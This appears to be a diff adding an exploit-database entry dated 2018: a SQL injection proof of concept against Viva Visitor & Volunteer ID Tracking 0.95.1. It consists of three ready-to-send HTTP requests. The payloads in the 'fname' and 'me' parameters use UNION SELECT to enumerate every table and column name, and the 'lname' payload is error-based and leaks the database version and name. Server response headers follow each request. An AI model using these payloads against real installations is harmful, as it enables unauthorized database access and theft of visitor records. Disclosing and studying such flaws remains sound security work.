@@ -1,0 +1,90 @@
+# Exploit Title: Viva Visitor & Volunteer ID Tracking 0.95.1 - 'fname' SQL Injection
+# Dork: N/A
+# Date: 2018-10-19
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://viva-visitor.sourceforge.io/
+# Software Link: https://sourceforge.net/projects/viva-visitor/files/latest/download
+# Version: 0.95.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/repeat_verify-n.php
+# Post / fname=[SQL]
+
+POST /[PATH]/repeat_verify-n.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 516
+fname=%22%22%27%27%27%20UniON%20SelECt%20nuLL%2cnuLL%2cCoNCat((selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x))%2cnuLL%2cnuLL%2cnuLL%2cnuLL%2cnuLL%2cnuLL--%20Efe
+HTTP/1.1 200 OK
+Date: Fri, 19 Oct 2018 20:58:30 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=3dc6r9l1ufi6bt2ngfedu84i92; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 3175
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/repeat_verify-n.php
+# Post / lname=[SQL]
+
+POST /[PATH]/repeat_verify-n.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=3dc6r9l1ufi6bt2ngfedu84i92
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 197
+lname=%'%20anD%20(SELecT%20112%20FRom(SelECT%20COunT(*),COncAT(version(),(SElecT%20(Elt(112=112,1))),dataBAse(),FLooR(RAnD(0)*2))x%20FroM%20INforMATIon_SCheMA.PluGINS%20GRouP%20By%20x)a)%20AnD'%'='
+HTTP/1.1 200 OK
+Date: Fri, 19 Oct 2018 21:03:13 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 817
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 3)
+# http://localhost/repeat_verify.php?me=[SQL]
+
+GET /[PATH]/repeat_verify.php?me=1%20UNION%20SeLECt%20NuLl%2cNuLl%2cCOnCaT((selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x))%2cNuLl%2cNuLl%2cNuLl%2cNuLl%2cNuLl%2cNuLl--%20Efe HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=3dc6r9l1ufi6bt2ngfedu84i92
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Fri, 19 Oct 2018 21:13:06 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 2714
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
